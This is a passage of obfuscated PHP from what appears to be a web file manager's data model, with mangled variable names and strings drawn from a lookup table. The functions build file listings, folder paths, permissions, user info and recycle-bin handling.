array_filter(array_unique($ÎÓ¢Šó)); if (!$ÎÓ¢Šó) { return; } $˜¯ƒÅÁê = array($¼ª€Ì”[551] => array($¼ª€Ì”[501], $ÎÓ¢Šó)); $ïãç„­Â = $¼ª€Ì”[552]; $ì€ ¦øÂ = Model($¼ª€Ì”[553])->field($ïãç„­Â)->where($˜¯ƒÅÁê)->select(); $ì€ ¦øÂ = array_to_keyvalue($ì€ ¦øÂ, $¼ª€Ì”[550]); $È¹Çï·‹ = Model($¼ª€Ì”[554])->field($¼ª€Ì”[555])->where($˜¯ƒÅÁê)->select(); $È¹Çï·‹ = $È¹Çï·‹ ? $È¹Çï·‹ : array(); $ßè•‰ÄÓ = array(); foreach ($È¹Çï·‹ as $Â’Ú¸à) { if (!isset($ßè•‰ÄÓ[$Â’Ú¸à[$¼ª€Ì”[550]]])) { $ßè•‰ÄÓ[$Â’Ú¸à[$¼ª€Ì”[550]]] = array(); } $ßè•‰ÄÓ[$Â’Ú¸à[$¼ª€Ì”[550]]][$Â’Ú¸à[$¼ª€Ì”[107]]] = $Â’Ú¸à[$¼ª€Ì”[459]]; } foreach ($¦ùáïï¤ as &$æÓ÷ÍÌó) { $¤¤£­¤È = $æÓ÷ÍÌó[$¼ª€Ì”[550]]; if (!$¤¤£­¤È || !is_array($ì€ ¦øÂ[$¤¤£­¤È])) { continue; } $†ÓÑÛº = $ì€ ¦øÂ[$¤¤£­¤È]; $†ÓÑÛº[$¼ª€Ì”[89]] = $æÓ÷ÍÌó[$¼ª€Ì”[89]]; $†ÓÑÛº[$¼ª€Ì”[32]] = $æÓ÷ÍÌó[$¼ª€Ì”[32]]; if (!$†ÓÑÛº[$¼ª€Ì”[556]]) { Model($¼ª€Ì”[553])->fileMd5Check($†ÓÑÛº); } if (!isset(self::$cacheFileInfo[$¼ª€Ì”[557] . $¤¤£­¤È])) { self::$cacheFileInfo[$¼ª€Ì”[557] . $¤¤£­¤È] = array_merge(array(), $†ÓÑÛº); } unset($ì€ ¦øÂ[$¤¤£­¤È][$¼ª€Ì”[97]]); $õçß¯³í = isset($ßè•‰ÄÓ[$¤¤£­¤È]) && is_array($ßè•‰ÄÓ[$¤¤£­¤È]) ? $ßè•‰ÄÓ[$¤¤£­¤È] : array(); $æÓ÷ÍÌó[$¼ª€Ì”[180]] = array_merge($õçß¯³í, $ì€ ¦øÂ[$¤¤£­¤È]); if (isset($æÓ÷ÍÌó[$¼ª€Ì”[180]][$¼ª€Ì”[194]])) { $æÓ÷ÍÌó[$¼ª€Ì”[194]] = json_decode($æÓ÷ÍÌó[$¼ª€Ì”[180]][$¼ª€Ì”[194]], !0); unset($æÓ÷ÍÌó[$¼ª€Ì”[180]][$¼ª€Ì”[194]]); } } unset($æÓ÷ÍÌó); } protected function _listAppendSourceInfo(&$õÒÎÆ, $¹“˜İÍÒ) { $ºØÈ’ªÏ =& $_SERVER[÷ôÚîå]; $æ‹½ßÉ‡ = Model($ºØÈ’ªÏ[558])->listData(); $şò‹ÛÅ = Model($ºØÈ’ªÏ[508])->listData(); $æ–Áˆë = Model($ºØÈ’ªÏ[498])->listData(); $öâ˜İ”ì = Model($ºØÈ’ªÏ[559])->listSimple(); $É…ô¡‡Ê = array_to_keyvalue($æ‹½ßÉ‡, $ºØÈ’ªÏ[484]); $šÂ’ƒÆ‰ = array_to_keyvalue_group($şò‹ÛÅ, $ºØÈ’ªÏ[97], $ºØÈ’ªÏ[509]); $µÑÔ¤Ú½ = array_to_keyvalue($æ–Áˆë, $ºØÈ’ªÏ[97]); $Êµ—äÆå = array_to_keyvalue_group($öâ˜İ”ì, $ºØÈ’ªÏ[203]); foreach ($õÒÎÆ as &$ÕƒÔÍ¿) { $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]] = array($ºØÈ’ªÏ[560] => 0, $ºØÈ’ªÏ[561] => 0, $ºØÈ’ªÏ[562] => 0); if (isset($µÑÔ¤Ú½[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]])) { $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[563]] = 1; $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[564]] = $µÑÔ¤Ú½[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]][$ºØÈ’ªÏ[32]]; } if ($šÂ’ƒÆ‰ && $É…ô¡‡Ê && isset($šÂ’ƒÆ‰[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]])) { $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[565]] = array(); foreach ($šÂ’ƒÆ‰[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]] as $Øğß×¦) { $ËÓÉäÅŠ = $É…ô¡‡Ê[$Øğß×¦]; $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[565]][] = array($ºØÈ’ªÏ[566] => $ËÓÉäÅŠ[$ºØÈ’ªÏ[484]], $ºØÈ’ªÏ[503] => $ËÓÉäÅŠ[$ºØÈ’ªÏ[32]], $ºØÈ’ªÏ[567] => $ËÓÉäÅŠ[$ºØÈ’ªÏ[568]]); } } if ($Êµ—äÆå && isset($Êµ—äÆå[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]])) { $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[569]] = array(); foreach ($Êµ—äÆå[$ÕƒÔÍ¿[$ºØÈ’ªÏ[203]]] as $À×Ú²Ë€) { $Ûñ©×‰ = $ºØÈ’ªÏ[570]; if ($À×Ú²Ë€[$ºØÈ’ªÏ[571]] == $ºØÈ’ªÏ[101]) { $Ûñ©×‰ .= $ºØÈ’ªÏ[572]; } $ÕƒÔÍ¿[$ºØÈ’ªÏ[100]][$ºØÈ’ªÏ[569]] = array_field_key($À×Ú²Ë€, explode($ºØÈ’ªÏ[50], $Ûñ©×‰)); } } } unset($ÕƒÔÍ¿); return $õÒÎÆ; } protected function _listAppendChildren(&$Î¿Ğ’ü¦, $¨—…ŸÀ) { $¼†Ğ¿œâ =& $_SERVER[÷ôÚîå]; $ÍóºÙÍ² = array(); $’âŠôö™ = array($¼†Ğ¿œâ[249] => 0, $¼†Ğ¿œâ[250] => 0); foreach ($Î¿Ğ’ü¦ as &$ÊÈä÷¸£) { if (!$ÊÈä÷¸£[$¼†Ğ¿œâ[494]]) { continue; } $ÍóºÙÍ²[] = $ÊÈä÷¸£[$¼†Ğ¿œâ[203]]; } unset($ÊÈä÷¸£); if (!$ÍóºÙÍ²) { return; } $ØÀº‘˜ª = array($¼†Ğ¿œâ[202] => array($¼†Ğ¿œâ[7], $ÍóºÙÍ²), $¼†Ğ¿œâ[514] => 0); $Á­—§àÓ = array($¼†Ğ¿œâ[202], $¼†Ğ¿œâ[494], $¼†Ğ¿œâ[573] => $¼†Ğ¿œâ[574]); $±ƒ¥Èï½ = $this->field($Á­—§àÓ)->where($ØÀº‘˜ª)->group($¼†Ğ¿œâ[575])->select(); $êÉ¥¹ßó = array(); foreach ($±ƒ¥Èï½ as $¾ÒŠÏğ¦) { $‰¬¿ò…¬ = $¾ÒŠÏğ¦[$¼†Ğ¿œâ[202]]; $¾Õ™Ôƒ = $¾ÒŠÏğ¦[$¼†Ğ¿œâ[494]] == $¼†Ğ¿œâ[101] ? $¼†Ğ¿œâ[250] : $¼†Ğ¿œâ[249]; if (!isset($êÉ¥¹ßó[$‰¬¿ò…¬])) { $êÉ¥¹ßó[$‰¬¿ò…¬] = array($¼†Ğ¿œâ[249] => 0, $¼†Ğ¿œâ[250] => 0); } $êÉ¥¹ßó[$‰¬¿ò…¬][$¾Õ™Ôƒ] += $¾ÒŠÏğ¦[$¼†Ğ¿œâ[574]]; } foreach ($Î¿Ğ’ü¦ as &$ÊÈä÷¸£) { if (!$ÊÈä÷¸£[$¼†Ğ¿œâ[494]]) { continue; } $˜²¾êŸÉ = is_array($êÉ¥¹ßó[$ÊÈä÷¸£[$¼†Ğ¿œâ[203]]]) ? $êÉ¥¹ßó[$ÊÈä÷¸£[$¼†Ğ¿œâ[203]]] : $’âŠôö™; $ÊÈä÷¸£[$¼†Ğ¿œâ[250]] = $˜²¾êŸÉ[$¼†Ğ¿œâ[250]]; $ÊÈä÷¸£[$¼†Ğ¿œâ[249]] = $˜²¾êŸÉ[$¼†Ğ¿œâ[249]]; unset($ÊÈä÷¸£[$¼†Ğ¿œâ[495]]); } unset($ÊÈä÷¸£); } protected function _listAppendAuth(&$¹¤ÈÂ¦­) { $Ô›ì«Ôè =& $_SERVER[÷ôÚîå]; $ë©†ÌÒ = array(); foreach ($¹¤ÈÂ¦­ as $”×õşœË) { if ($”×õşœË[$Ô›ì«Ôè[200]] == self::TYPE_GROUP) { $ë©†ÌÒ[] = $”×õşœË[$Ô›ì«Ôè[203]]; } } if (!$ë©†ÌÒ) { return; } $éÜËÓµú = array_to_keyvalue($¹¤ÈÂ¦­, $Ô›ì«Ôè[203]); $š»€ÉßÊ = Model($Ô›ì«Ôè[576])->getSourceList($ë©†ÌÒ, $éÜËÓµú); $ÈºÏ³£½ = KodUser::isRoot(); foreach ($¹¤ÈÂ¦­ as $å«º¡¹ğ => &$”×õşœË) { $”×õşœË[$Ô›ì«Ôè[496]] = $š»€ÉßÊ[$”×õşœË[$Ô›ì«Ôè[203]]]; if (!$”×õşœË[$Ô›ì«Ôè[496]] && $”×õşœË[$Ô›ì«Ôè[200]] == self::TYPE_GROUP) { $”×õşœË[$Ô›ì«Ôè[496]] = Action($Ô›ì«Ôè[577])->pathGroupAuthMake($”×õşœË[$Ô›ì«Ôè[578]]); if (!$”×õşœË[$Ô›ì«Ôè[496]] && !$ÈºÏ³£½) { $”×õşœË[$Ô›ì«Ôè[243]] = !1; $”×õşœË[$Ô›ì«Ôè[242]] = !1; } } if ($”×õşœË[$Ô›ì«Ôè[496]]) { $”×õşœË[$Ô›ì«Ôè[243]] = AuthModel::authCheckEdit($”×õşœË[$Ô›ì«Ôè[496]][$Ô›ì«Ôè[497]]); $”×õşœË[$Ô›ì«Ôè[242]] = AuthModel::authCheckView($”×õşœË[$Ô›ì«Ôè[496]][$Ô›ì«Ôè[497]]); } $this->groupPathDisplay($”×õşœË); } unset($”×õşœË); } public function _listAppendAuthSecret(&$íğ†–«ù) { $¦ŠˆÕ®ä =& $_SERVER[÷ôÚîå]; if (Model($¦ŠˆÕ®ä[517])->get($¦ŠˆÕ®ä[579]) != $¦ŠˆÕ®ä[101]) { return; } static $ìâ¡á¦å = false; if (!$ìâ¡á¦å) { $óÛÓÃùì = Model($¦ŠˆÕ®ä[580]); $óÉ–æùü = Model($¦ŠˆÕ®ä[581]); $ìâ¡á¦å = $óÉ–æùü->listData(); $ìâ¡á¦å = array_to_keyvalue($ìâ¡á¦å, $¦ŠˆÕ®ä[203]); $ÙÉ§£¬à = json_decode(Model($¦ŠˆÕ®ä[517])->get($¦ŠˆÕ®ä[582]), !0); $ÙÉ§£¬à = array_to_keyvalue($ÙÉ§£¬à, $¦ŠˆÕ®ä[484]); foreach ($ìâ¡á¦å as $É±Å“ÒÀ => $ÅÂë±§‰) { $à€‰°×İ = $ÙÉ§£¬à[$ÅÂë±§‰[$¦ŠˆÕ®ä[583]]]; if (!$à€‰°×İ) { $óÉ–æùü->remove($ÅÂë±§‰[$¦ŠˆÕ®ä[484]]); unset($ìâ¡á¦å[$É±Å“ÒÀ]); continue; } $Ñ—Ê‚ Ú = $óÛÓÃùì->listData($à€‰°×İ[$¦ŠˆÕ®ä[496]]); if (!$Ñ—Ê‚ Ú) { $óÉ–æùü->remove($ÅÂë±§‰[$¦ŠˆÕ®ä[484]]); unset($ìâ¡á¦å[$É±Å“ÒÀ]); continue; } $ÅÂë±§‰[$¦ŠˆÕ®ä[496]] = $Ñ—Ê‚ Ú; $ÅÂë±§‰[$¦ŠˆÕ®ä[584]] = $à€‰°×İ; $ÅÂë±§‰[$¦ŠˆÕ®ä[585]] = Model($¦ŠˆÕ®ä[586])->getInfoSimpleOuter($ÅÂë±§‰[$¦ŠˆÕ®ä[536]]); $ìâ¡á¦å[$É±Å“ÒÀ] = $ÅÂë±§‰; } } $ùÃ“›Ï = USER_ID; $úŞöôØû = array(); $¯¹Ï”µ = $this->_listAppendPath($úŞöôØû, !0); foreach ($íğ†–«ù as $É±Å“ÒÀ => &$ÅÂë±§‰) { if (!is_array($ÅÂë±§‰[$¦ŠˆÕ®ä[496]])) { continue; } if ($ÅÂë±§‰[$¦ŠˆÕ®ä[200]] != $¦ŠˆÕ®ä[587]) { continue; } if (isset($ìâ¡á¦å[$ÅÂë±§‰[$¦ŠˆÕ®ä[203]]])) { $ÍÎÒ²š¨ = $ìâ¡á¦å[$ÅÂë±§‰[$¦ŠˆÕ®ä[203]]]; if (!is_array($ÅÂë±§‰[$¦ŠˆÕ®ä[548]])) { $ÅÂë±§‰[$¦ŠˆÕ®ä[548]] = array(); } $ÅÂë±§‰[$¦ŠˆÕ®ä[548]][$¦ŠˆÕ®ä[588]] = $ÍÎÒ²š¨[$¦ŠˆÕ®ä[583]]; $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[589]] = $ÍÎÒ²š¨; $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[590]] = $ÅÂë±§‰[$¦ŠˆÕ®ä[591]]; $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[592]] = $¦ŠˆÕ®ä[101]; if ($ÍÎÒ²š¨[$¦ŠˆÕ®ä[536]] != $ùÃ“›Ï) { $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[497]] = $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[497]] & $ÍÎÒ²š¨[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[496]]; } continue; } $Š†ş¡¼‹ = $this->parentLevelArray($ÅÂë±§‰[$¦ŠˆÕ®ä[593]]); $°µ°Ê• = array_reverse($Š†ş¡¼‹); foreach ($°µ°Ê• as $‘§ÆÂ¹ => $µÀ÷™Äà) { if (!isset($ìâ¡á¦å[$µÀ÷™Äà])) { continue; } $ÍÎÒ²š¨ = $ìâ¡á¦å[$µÀ÷™Äà]; $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[589]] = $ÍÎÒ²š¨; if ($ÍÎÒ²š¨[$¦ŠˆÕ®ä[536]] != $ùÃ“›Ï) { $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[497]] = $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[497]] & $ÍÎÒ²š¨[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[496]]; } $ŸË¶ÇÎƒ = $¦ŠˆÕ®ä[12]; $ëİå÷ºö = count($Š†ş¡¼‹) - $‘§ÆÂ¹; for ($‹Ê‹¦“  = 0; $‹Ê‹¦“  < $ëİå÷ºö; $‹Ê‹¦“ ++) { if (!isset($¯¹Ï”µ[$Š†ş¡¼‹[$‹Ê‹¦“ ]])) { $ŸË¶ÇÎƒ = $¦ŠˆÕ®ä[12]; break; } $ŸË¶ÇÎƒ = $ŸË¶ÇÎƒ . rtrim($¯¹Ï”µ[$Š†ş¡¼‹[$‹Ê‹¦“ ]], $¦ŠˆÕ®ä[8]) . $¦ŠˆÕ®ä[8]; } $ÅÂë±§‰[$¦ŠˆÕ®ä[496]][$¦ŠˆÕ®ä[590]] = rtrim($ŸË¶ÇÎƒ, $¦ŠˆÕ®ä[8]) . $¦ŠˆÕ®ä[8]; break; } } unset($ÅÂë±§‰); } public function groupPathDisplay(&$¤„Û¶İÕ) { $˜—ãÂ¢ =& $_SERVER[÷ôÚîå]; if ($¤„Û¶İÕ[$˜—ãÂ¢[200]] != self::TYPE_GROUP) { return; } $ğ´Æ¬¹— = Model($˜—ãÂ¢[594])->getInfo($¤„Û¶İÕ[$˜—ãÂ¢[578]]); $æ¦ õ±‘ = $this->parentLevelArray($ğ´Æ¬¹—[$˜—ãÂ¢[593]]); $³ĞŞŠƒè = $˜—ãÂ¢[12]; foreach ($æ¦ õ±‘ as $çİè„½á) { $®Á¤°áû = Model($˜—ãÂ¢[594])->getInfo($çİè„½á); $³ĞŞŠƒè .= $®Á¤°áû[$˜—ãÂ¢[100]][$˜—ãÂ¢[203]] . $˜—ãÂ¢[50]; } $¤„Û¶İÕ[$˜—ãÂ¢[595]] = $ğ´Æ¬¹—[$˜—ãÂ¢[202]]; $¤„Û¶İÕ[$˜—ãÂ¢[596]] = $ğ´Æ¬¹—[$˜—ãÂ¢[593]]; $¤„Û¶İÕ[$˜—ãÂ¢[597]] = $ğ´Æ¬¹—[$˜—ãÂ¢[598]]; $¤„Û¶İÕ[$˜—ãÂ¢[599]] = $³ĞŞŠƒè . $ğ´Æ¬¹—[$˜—ãÂ¢[100]][$˜—ãÂ¢[203]]; } protected function _listAppendPath(&$õÓÓš°, $µ×ÁŒŸ¡ = false) { $ñıÙ×„½ =& $_SERVER[÷ôÚîå]; static $ ¤±‘ğ = array(); $‰®ÄÒ»ú = array(); $Øè½Ëôù = array(); if ($µ×ÁŒŸ¡) { return $ ¤±‘ğ; } foreach ($õÓÓš° as &$ÏÂ©æÊÂ) { $¯—®×¸ñ = $ÏÂ©æÊÂ[$ñıÙ×„½[203]]; if ($ÏÂ©æÊÂ[$ñıÙ×„½[494]] == $ñıÙ×„½[101] && $ÏÂ©æÊÂ[$ñıÙ×„½[202]] != 0) { $ ¤±‘ğ[$¯—®×¸ñ] = $ÏÂ©æÊÂ[$ñıÙ×„½[32]]; } if ($ÏÂ©æÊÂ[$ñıÙ×„½[494]] == $ñıÙ×„½[101] && $ÏÂ©æÊÂ[$ñıÙ×„½[202]] == 0) { $ ¤±‘ğ[$¯—®×¸ñ] = $this->_listAppendPathRoot($ÏÂ©æÊÂ, array()); } if (isset($Øè½Ëôù[$ÏÂ©æÊÂ[$ñıÙ×„½[593]]])) { continue; } $Øè½Ëôù[$ÏÂ©æÊÂ[$ñıÙ×„½[593]]] = !0; $¥ÄĞÏ¦® = $this->parentLevelArray($ÏÂ©æÊÂ[$ñıÙ×„½[593]]); foreach ($¥ÄĞÏ¦® as $ª°Ë©ò => $§Á´ØÍ“) { if (isset($ ¤±‘ğ[$§Á´ØÍ“])) { continue; } if ($ª°Ë©ò == 0) { $ ¤±‘ğ[$§Á´ØÍ“] = $this->_listAppendPathRoot($ÏÂ©æÊÂ, $¥ÄĞÏ¦®); } if ($ª°Ë©ò != 0) { $‰®ÄÒ»ú[] = $§Á´ØÍ“; } } } unset($ÏÂ©æÊÂ); $‰®ÄÒ»ú = array_unique($‰®ÄÒ»ú); if (count($‰®ÄÒ»ú) > 0) { $Şİôş§ = array($ñıÙ×„½[500] => array($ñıÙ×„½[501], $‰®ÄÒ»ú)); if (count($‰®ÄÒ»ú) == 1) { $Ä‡¨ÙÕ = $this->sourceInfo($‰®ÄÒ»ú[0]); $Áˆ½ğÁ— = is_array($Ä‡¨ÙÕ) ? array($Ä‡¨ÙÕ) : !1; } else { $Áˆ½ğÁ— = $this->field($ñıÙ×„½[600])->where($Şİôş§)->select(); } if (!$Áˆ½ğÁ—) { $Áˆ½ğÁ— = array(); } foreach ($Áˆ½ğÁ— as $Æò¶”ê) { $ ¤±‘ğ[$Æò¶”ê[$ñıÙ×„½[203]]] = $Æò¶”ê[$ñıÙ×„½[32]]; } } $ƒê¥úğ¼ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $“ğ•â² = array(); foreach ($õÓÓš° as &$ÏÂ©æÊÂ) { $üÈš–˜ğ = $ÏÂ©æÊÂ[$ñıÙ×„½[593]]; $á²Ÿ¨«¥ = $ñıÙ×„½[12]; if (isset($“ğ•â²[$üÈš–˜ğ])) { $á²Ÿ¨«¥ = $“ğ•â²[$üÈš–˜ğ]; } else { $¥ÄĞÏ¦® = $this->parentLevelArray($ÏÂ©æÊÂ[$ñıÙ×„½[593]]); foreach ($¥ÄĞÏ¦® as $ª°Ë©ò => $§Á´ØÍ“) { if (isset($ ¤±‘ğ[$§Á´ØÍ“])) { $á²Ÿ¨«¥ .= $ ¤±‘ğ[$§Á´ØÍ“] . $ñıÙ×„½[8]; } } $“ğ•â²[$üÈš–˜ğ] = $á²Ÿ¨«¥; } $á²Ÿ¨«¥ .= $ÏÂ©æÊÂ[$ñıÙ×„½[32]]; if ($ÏÂ©æÊÂ[$ñıÙ×„½[494]] == $ñıÙ×„½[101]) { $á²Ÿ¨«¥ .= $ñıÙ×„½[8]; } $ÏÂ©æÊÂ[$ñıÙ×„½[591]] = str_replace($ñıÙ×„½[601], $ñıÙ×„½[8], $á²Ÿ¨«¥); if ($ÏÂ©æÊÂ[$ñıÙ×„½[202]] == $ñıÙ×„½[238]) { $ÏÂ©æÊÂ[$ñıÙ×„½[32]] = trim($ ¤±‘ğ[$ÏÂ©æÊÂ[$ñıÙ×„½[203]]], $ñıÙ×„½[8]); $ÏÂ©æÊÂ[$ñıÙ×„½[591]] = $ÏÂ©æÊÂ[$ñıÙ×„½[32]] . $ñıÙ×„½[8]; } if (intval($ÏÂ©æÊÂ[$ñıÙ×„½[200]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÏÂ©æÊÂ, $¥ÄĞÏ¦®, $ƒê¥úğ¼); } } unset($ÏÂ©æÊÂ); return $õÓÓš°; } private function _listAppendPathRecycle(&$¥´¶ÒÓ, $ÔÒ¤›öß, $œâÁº‚ñ) { $şõ€³µ =& $_SERVER[÷ôÚîå]; if (!in_array($œâÁº‚ñ, $ÔÒ¤›öß) && $¥´¶ÒÓ[$şõ€³µ[203]] != $œâÁº‚ñ) { return; } $ÛÚœçó× = explode($şõ€³µ[8], trim($¥´¶ÒÓ[$şõ€³µ[591]], $şõ€³µ[8])); $ °¬Õè = implode($şõ€³µ[8], array_slice($ÛÚœçó×, 2)); $¥´¶ÒÓ[$şõ€³µ[591]] = $şõ€³µ[8] . LNG($şõ€³µ[602]) . $şõ€³µ[8] . ltrim($ °¬Õè, $şõ€³µ[8]); $¥´¶ÒÓ[$şõ€³µ[593]] = $şõ€³µ[603] . implode($şõ€³µ[50], array_slice($ÔÒ¤›öß, 1)) . $şõ€³µ[50]; if ($¥´¶ÒÓ[$şõ€³µ[203]] == $œâÁº‚ñ) { $¥´¶ÒÓ[$şõ€³µ[593]] = $şõ€³µ[603]; $¥´¶ÒÓ[$şõ€³µ[202]] = $şõ€³µ[238]; $¥´¶ÒÓ[$şõ€³µ[32]] = LNG($şõ€³µ[602]); } $¥´¶ÒÓ[$şõ€³µ[604]] = $şõ€³µ[605]; } protected function _listAppendPathRoot(&$î†›¿—, $Š¦ÚİŸ‡) { $Ûğé© ³ =& $_SERVER[÷ôÚîå]; static $¦íŠİù­ = false; $ü…Ï“•Ñ = $Ûğé© ³[12]; if ($î†›¿—[$Ûğé© ³[200]] == self::TYPE_USER) { if ($î†›¿—[$Ûğé© ³[578]] == USER_ID) { $ü…Ï“•Ñ = LNG($Ûğé© ³[606]); if ($¦íŠİù­ === !1) { $¬ß÷¬Ê = Model($Ûğé© ³[607])->getInfoFull(USER_ID); $¦íŠİù­ = _get($¬ß÷¬Ê, $Ûğé© ³[608], $Ûğé© ³[12]); } if ($Š¦ÚİŸ‡ && $Š¦ÚİŸ‡[0] == $¦íŠİù­ || !$Š¦ÚİŸ‡ && $î†›¿—[$Ûğé© ³[203]] == $¦íŠİù­) { $ü…Ï“•Ñ = LNG($Ûğé© ³[609]); $î†›¿—[$Ûğé© ³[610]] = $Ûğé© ³[611]; } if (!$Š¦ÚİŸ‡) { $î†›¿—[$Ûğé© ³[32]] = $ü…Ï“•Ñ; } } else { $î†›¿—[$Ûğé© ³[612]] = Model($Ûğé© ³[586])->getInfoSimpleOuter($î†›¿—[$Ûğé© ³[578]]); $ü…Ï“•Ñ = LNG($Ûğé© ³[613]) . $Ûğé© ³[186] . $î†›¿—[$Ûğé© ³[612]][$Ûğé© ³[32]] . $Ûğé© ³[188]; } } else { if ($î†›¿—[$Ûğé© ³[200]] == self::TYPE_GROUP) { $ğâ’Ë– = Model($Ûğé© ³[594])->getInfoSimple($î†›¿—[$Ûğé© ³[578]]); $ü…Ï“•Ñ = $ğâ’Ë–[$Ûğé© ³[32]]; } else { if ($î†›¿—[$Ûğé© ³[200]] == self::TYPE_SYSTEM) { $ü…Ï“•Ñ = $Ûğé© ³[614]; } } } $ü…Ï“•Ñ = $ü…Ï“•Ñ ? $Ûğé© ³[8] . $ü…Ï“•Ñ . $Ûğé© ³[8] : $Ûğé© ³[8]; return $ü…Ï“•Ñ; } protected function _listAppendUser(&$‰’¾…Š) { $’…Ÿ³Ìæ =& $_SERVER[÷ôÚîå]; $±ñÃÁ¼ = array_to_keyvalue($‰’¾…Š, $’…Ÿ³Ìæ[12], $’…Ÿ³Ìæ[536]); $¬­’Ğòö = array_to_keyvalue($‰’¾…Š, $’…Ÿ³Ìæ[12], $’…Ÿ³Ìæ[538]); $ŒÜË­Ò¨ = array_merge($±ñÃÁ¼, $¬­’Ğòö); $Û—‹Î¿† = Model($’…Ÿ³Ìæ[607])->userListInfo($ŒÜË­Ò¨); foreach ($‰’¾…Š as &$ª¥ê‰´‹) { $¶ìÄ¿Ä€ = $ª¥ê‰´‹[$’…Ÿ³Ìæ[536]]; $ª¥ê‰´‹[$’…Ÿ³Ìæ[536]] = $Û—‹Î¿†[$¶ìÄ¿Ä€] ? $Û—‹Î¿†[$¶ìÄ¿Ä€] : !1; $¶ìÄ¿Ä€ = $ª¥ê‰´‹[$’…Ÿ³Ìæ[538]]; $ª¥ê‰´‹[$’…Ÿ³Ìæ[538]] = $Û—‹Î¿†[$¶ìÄ¿Ä€] ? $Û—‹Î¿†[$¶ìÄ¿Ä€] : !1; if (_get($ª¥ê‰´‹, $’…Ÿ³Ìæ[615], 0)) { $‚“×âãÄ = $GLOBALS[$’…Ÿ³Ìæ[6]][$’…Ÿ³Ìæ[102]][$’…Ÿ³Ìæ[616]]; if ($ª¥ê‰´‹[$’…Ÿ³Ìæ[548]][$’…Ÿ³Ìæ[617]] <= time() - $‚“×âãÄ) { $this->metaSet($ª¥ê‰´‹[$’…Ÿ³Ìæ[203]], $’…Ÿ³Ìæ[618], null); $this->metaSet($ª¥ê‰´‹[$’…Ÿ³Ìæ[203]], $’…Ÿ³Ìæ[617], null); unset($ª¥ê‰´‹[$’…Ÿ³Ìæ[548]][$’…Ÿ³Ìæ[618]]); continue; } $ï›šäî™ = $ª¥ê‰´‹[$’…Ÿ³Ìæ[548]][$’…Ÿ³Ìæ[618]]; $ª¥ê‰´‹[$’…Ÿ³Ìæ[548]][$’…Ÿ³Ìæ[619]] = Model($’…Ÿ³Ìæ[607])->getInfoSimpleOuter($ï›šäî™); } } unset($ª¥ê‰´‹); } public function parentLevelArray($«²«‡•) { $È‰˜î†É =& $_SERVER[÷ôÚîå]; $«²«‡• = explode($È‰˜î†É[50], trim($«²«‡•, $È‰˜î†É[50])); return array_remove_value($«²«‡•, $È‰˜î†É[238]); } public function listAll($àÃÜ‰Û¿) { $‹öÎÖñ =& $_SERVER[÷ôÚîå]; $ŸÜ‰ê†… = $this->sourceInfo($àÃÜ‰Û¿); $Ã½Œ½Çè = array($‹öÎÖñ[620] => array($‹öÎÖñ[621], $ŸÜ‰ê†…[$‹öÎÖñ[593]] . $àÃÜ‰Û¿ . $‹öÎÖñ[622]), $‹öÎÖñ[623] => 0); $Â¯Ş€øà = $‹öÎÖñ[624]; $ÆªÏµàÒ = "\114\105\x46\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\x6c\x65\40\x66\x69\x6c\x65\40\157\156\40\163\157\x75\x72\143\x65\56\x66\x69\x6c\145\111\104\40\x3d\x20\x66\151\x6c\145\56\x66\151\x6c\145\111\x44"; $ãõÜÙø = $this->alias($‹öÎÖñ[528])->field($Â¯Ş€øà)->where($Ã½Œ½Çè)->join($ÆªÏµàÒ)->select(); $this->_listAppendAuth($ãõÜÙø); $this->_listAppendUser($ãõÜÙø); $this->_listAppendPath($ãõÜÙø); $ãõÜÙø = array_to_keyvalue($ãõÜÙø, $‹öÎÖñ[203]); $›²œó¿· = "\57{$ŸÜ‰ê†…[$‹öÎÖñ[32]]}\x2f"; $›²œó¿· = $›²œó¿· == $‹öÎÖñ[601] ? $‹öÎÖñ[8] : $›²œó¿·; $ìğÅßïÅ = array(); foreach ($ãõÜÙø as $À… Çõ® => $æã¢’Ñ…) { $‚‚½¢á = $this->parentLevelArray($æã¢’Ñ…[$‹öÎÖñ[593]]); array_shift($‚‚½¢á); $ãâşš = $›²œó¿·; for ($û´ßËñ· = 0; $û´ßËñ· < count($‚‚½¢á); $û´ßËñ·++) { $ãâşš .= $ãõÜÙø[$‚‚½¢á[$û´ßËñ·]][$‹öÎÖñ[32]] . $‹öÎÖñ[8]; } $ãâşš .= $æã¢’Ñ…[$‹öÎÖñ[32]]; if ($æã¢’Ñ…[$‹öÎÖñ[494]]) { $ãâşš .= $‹öÎÖñ[8]; } $Ìû¥Ç™ = array($‹öÎÖñ[504] => str_replace($‹öÎÖñ[601], $‹öÎÖñ[8], str_replace($‹öÎÖñ[601], $‹öÎÖñ[8], str_replace($‹öÎÖñ[601], $‹öÎÖñ[8], $ãâşš))), $‹öÎÖñ[625] => intval($æã¢’Ñ…[$‹öÎÖñ[494]]), $‹öÎÖñ[626] => intval($æã¢’Ñ…[$‹öÎÖñ[89]]), $‹öÎÖñ[98] => intval($æã¢’Ñ…[$‹öÎÖñ[98]]), 